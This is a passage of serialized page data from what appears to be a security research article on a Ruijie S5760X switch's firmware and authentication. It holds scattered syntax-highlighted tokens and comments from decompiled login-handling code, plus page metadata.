className\":\"hljs-keyword\",\"children\":\"return\"}]\n77:[\"$\",\"span\",\"span-70\",{\"className\":\"hljs-number\",\"children\":\"2\"}]\n78:[\"$\",\"span\",\"span-71\",{\"className\":\"hljs-keyword\",\"children\":\"else\"}]\n79:[\"$\",\"span\",\"span-72\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\n7a:[\"$\",\"span\",\"span-73\",{\"className\":\"hljs-number\",\"children\":\"2\"}]\n7b:[\"$\",\"span\",\"span-74\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n7c:[\"$\",\"span\",\"span-75\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n7d:[\"$\",\"span\",\"span-76\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\n7e:[\"$\",\"span\",\"span-77\",{\"className\":\"hljs-literal\",\"children\":\"true\"}]\n7f:[\"$\",\"span\",\"span-78\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n80:[\"$\",\"span\",\"span-41\",{\"className\":\"hljs-built_in\",\"children\":\"memset\"}]\n81:[\"$\",\"span\",\"span-42\",{\"className\":\"hljs-number\",\"children\":\"0\"}]\n82:[\"$\",\"span\",\"span-43\",{\"className\":\"hljs-keyword\",\"children\":\"sizeof\"}]\n83:[\"$\""])</script><script>self.__next_f.push([1,",\"span\",\"span-44\",{\"className\":\"hljs-comment\",\"children\":\"// Clear the time structure.\"}]\n84:[\"$\",\"span\",\"span-45\",{\"className\":\"hljs-number\",\"children\":\"1\"}]\n85:[\"$\",\"span\",\"span-46\",{\"className\":\"hljs-comment\",\"children\":\"// Read the current time.\"}]\n86:[\"$\",\"span\",\"span-47\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\n87:[\"$\",\"span\",\"span-48\",{\"className\":\"hljs-built_in\",\"children\":\"strcmp\"}]\n88:[\"$\",\"span\",\"span-49\",{\"className\":\"hljs-string\",\"children\":\"\\\"admin\\\"\"}]\n89:[\"$\",\"span\",\"span-50\",{\"className\":\"hljs-comment\",\"children\":\"// The username is admin.\"}]\n8a:[\"$\",\"span\",\"span-51\",{\"className\":\"hljs-comment\",\"children\":\"// Lock access to the global array.\"}]\n8b:[\"$\",\"span\",\"span-52\",{\"className\":\"hljs-number\",\"children\":\"0\"}]\n8c:[\"$\",\"span\",\"span-53\",{\"className\":\"hljs-keyword\",\"children\":\"while\"}]\n8d:[\"$\",\"span\",\"span-54\",{\"className\":\"hljs-number\",\"children\":\"2\"}]\n8e:[\"$\",\"span\",\"span-55\",{\"className\":\"hljs-comment\",\"children\":\"// Iterate over the global-array entries.\"}]\n8f:[\"$\",\"span\",\"span-56\",{\"className\":\"hljs-number\",\"children\":\"4\"}]\n90:[\"$\",\"span\",\"span-57\",{\"className\":\"hljs-number\",\"children\":\"6\"}]\n91:[\"$\",\"span\",\"span-58\",{\"className\":\"hljs-keyword\",\"children\":\"for\"}]\n92:[\"$\",\"span\",\"span-59\",{\"className\":\"hljs-type\",\"children\":\"char\"}]\n93:[\"$\",\"span\",\"span-60\",{\"className\":\"hljs-number\",\"children\":\"272\"}]\n94:[\"$\",\"span\",\"span-61\",{\"className\":\"hljs-type\",\"children\":\"char\"}]\n95:[\"$\",\"span\",\"span-62\",{\"className\":\"hljs-number\",\"children\":\"272\"}]\n96:[\"$\",\"span\",\"span-63\",{\"className\":\"hljs-number\",\"children\":\"34\"}]\n97:[\"$\",\"span\",\"span-64\",{\"className\":\"hljs-number\",\"children\":\"0\"}]\n98:[\"$\",\"span\",\"span-65\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\n99:[\"$\",\"span\",\"span-66\",{\"className\":\"hljs-number\",\"children\":\"272\"}]\n9a:[\"$\",\"span\",\"span-67\",{\"className\":\"hljs-type\",\"children\":\"char\"}]\n9b:[\"$\",\"span\",\"span-68\",{\"className\":\"hljs-number\",\"children\":\"4\"}]\n9c:[\"$\",\"span\",\"span-69\",{\"className\":\"hljs-number\",\"children\":\"6\"}]\n9d:[\"$\",\"span\",\"span-70\",{\"className\":\"hljs-keyword\",\"children\":\"break\"}]\n9e:[\"$\",\"span\",\"span-71\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\n9f:[\"$\",\"span\",\"span-72\",{\"className\":\"hljs-built_in\",\"children\":\"strcmp\"}]\na0:[\"$\",\"span\",\"span-73\",{\"className\":\"hljs-comment\",\"children\":\"// Found this user's login record.\"}]\na1:[\"$\",\"span\",\"span-74\",{\"className\":\"hljs-keyword\",\"children\":\"break\"}]\na2:[\"$\",\"span\",\"span-75\",{\"className\":\"hljs-number\",\"children\":\"34\"}]\na3:[\"$\",\"span\",\"span-76\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\na4:[\"$\",\"span\",\"span-77\",{\"className\":\"hljs-number\",\"children\":\"272\"}]\na5:[\"$\",\"span\",\"span-78\",{\"className\":\"hljs-type\",\"children\":\"char\"}]\na6:[\"$\",\"span\",\"span-79\",{\"className\":\"hljs-number\",\"children\":\"4\"}]\na7:[\"$\",\"span\",\"span-80\",{\"className\":\"hljs-number\",\"children\":\"6\"}]\na8:[\"$\",\"span\",\"span-81\",{\"className\":\"hljs-keyword\",\"children\":\"continue\"}]\na9:[\"$\",\"span\",\"span-82\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\naa:[\"$\",\"span\",\"span-83\",{\"className\":\"hljs-number\",\"children\":\"38\"}]\nab:[\"$\",\"span\",\"span-84\",{\"className\":\"hljs-number\",\"children\":\"599\"}]\nac:[\"$\",\"span\",\"span-85\",{\"className\":\"hljs-number\",\"children\":\"80\"}]\nad:[\"$\",\"span\",\"span-86\",{\"className\":\"hljs-number\",\"children\":\"0\"}]\nae:[\"$\",\"span\",\"span-87\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\naf:[\"$\",\"span\",\"span-88\",{\"className\":\"hljs-type\",\"children\":\"int\"}]\nb0:[\"$\",\"span\",\"span-89\",{\"className\":\"hljs-number\",\"children\":\"80\"}]\nb1:[\"$\",\"span\",\"span-90\",{\"className\":\"hljs-number\",\"children\":\"4\"}]\nb2:[\"$\",\"span\",\"span-91\",{\"className\":\"hljs-comment\",\"children\":\"// Check whether consecutive login attempts exceed four.\"}]\nb3:[\"$\",\"span\",\"span-92\",{\"className\":\"hljs-number\",\"children\":\"0LL\"}]\nb4:[\"$\",\"span\",\"span-93\",{\"className\":\"hljs-string\",\"children\":\"\\\"user login limited\\\"\"}]\nb5:[\"$\",\"span\",\"span-94\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\nb6:[\"$\",\"span\",\"span-95\",{\"className\":\"hljs-number\",\"children\":\"11LL\"}]\nb7:[\"$\",\"span\",\"span-96\",{\"className\":\"hljs-keyword\",\"children\":\"else\"}]\nb8:[\"$\",\"span\",\"span-97\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\nb9:[\"$\",\"span\",\""])</script><script>self.__next_f.push([1,"span-98\",{\"className\":\"hljs-built_in\",\"children\":\"strcmp\"}]\nba:[\"$\",\"span\",\"span-99\",{\"className\":\"hljs-number\",\"children\":\"129\"}]\nbb:[\"$\",\"span\",\"span-100\",{\"className\":\"hljs-comment\",\"children\":\"// The authentication value matches.\"}]\nbc:[\"$\",\"span\",\"span-101\",{\"className\":\"hljs-number\",\"children\":\"80\"}]\nbd:[\"$\",\"span\",\"span-102\",{\"className\":\"hljs-number\",\"children\":\"0\"}]\nbe:[\"$\",\"span\",\"span-103\",{\"className\":\"hljs-comment\",\"children\":\"// Reset the login-attempt counter.\"}]\nbf:[\"$\",\"span\",\"span-104\",{\"className\":\"hljs-number\",\"children\":\"1\"}]\nc0:[\"$\",\"span\",\"span-105\",{\"className\":\"hljs-keyword\",\"children\":\"struct\"}]\nc1:[\"$\",\"span\",\"span-106\",{\"className\":\"hljs-number\",\"children\":\"18\"}]\nc2:[\"$\",\"span\",\"span-107\",{\"className\":\"hljs-comment\",\"children\":\"// Record the login time.\"}]\nc3:[\"$\",\"span\",\"span-108\",{\"className\":\"hljs-comment\",\"children\":\"// Unlock the global array.\"}]\nc4:[\"$\",\"span\",\"span-109\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\nc5:[\"$\",\"span\",\"span-110\",{\"className\":\"hljs-built_in\",\"children\":\"strcmp\"}]\nc6:[\"$\",\"span\",\"span-111\",{\"className\":\"hljs-type\",\"children\":\"const\"}]\nc7:[\"$\",\"span\",\"span-112\",{\"className\":\"hljs-type\",\"children\":\"char\"}]\nc8:[\"$\",\"span\",\"span-113\",{\"className\":\"hljs-number\",\"children\":\"33\"}]\nc9:[\"$\",\"span\",\"span-114\",{\"className\":\"hljs-number\",\"children\":\"5LL\"}]\nca:[\"$\",\"span\",\"span-115\",{\"className\":\"hljs-string\",\"children\":\"\\\"HTTPD\\\"\"}]\ncb:[\"$\",\"span\",\"span-116\",{\"className\":\"hljs-string\",\"children\":\"\\\"LOGIN\\\"\"}]\ncc:[\"$\",\"span\",\"span-117\",{\"className\":\"hljs-number\",\"children\":\"1LL\"}]\ncd:[\"$\",\"span\",\"span-118\",{\"className\":\"hljs-string\",\"children\":\"\\\"User (%s@%s) login from eweb.\\\"\"}]\nce:[\"$\",\"span\",\"span-119\",{\"className\":\"hljs-type\",\"children\":\"const\"}]\ncf:[\"$\",\"span\",\"span-120\",{\"className\":\"hljs-type\",\"children\":\"char\"}]\nd0:[\"$\",\"span\",\"span-121\",{\"className\":\"hljs-number\",\"children\":\"72\"}]\nd1:[\"$\",\"span\",\"span-122\",{\"className\":\"hljs-built_in\",\"children\":\"strncpy\"}]\nd2:[\"$\",\"span\",\"span-123\",{\"className\":\"hljs-number\",\"children\":\"0x1Fu\"}]\nd3:[\"$\",\"span\",\"span-124\",{\"className\":\"hljs-comment\",\"children\":\"// Copy the username to a2.\"}]\nd4:[\"$\",\"span\",\"span-125\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\nd5:[\"$\",\"span\",\"span-126\",{\"className\":\"hljs-number\",\"children\":\"0LL\"}]\nd6:[\"$\",\"span\",\"span-127\",{\"className\":\"hljs-comment\",\"children\":\"// Report success.\"}]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"d9:I[27201,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"IconMark\"]\n9:null\ne:[[\"$\",\"title\",\"0\",{\"children\":\"Inside the Ruijie S5760X. — Security Research\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Firmware extraction, HTTP services, and authentication boundaries.\"}],[\"$\",\"link\",\"2\",{\"rel\":\"icon\",\"href\":\"/icon.svg\"}],[\"$\",\"$Ld9\",\"3\",{}]]\n"])</script></body></html>
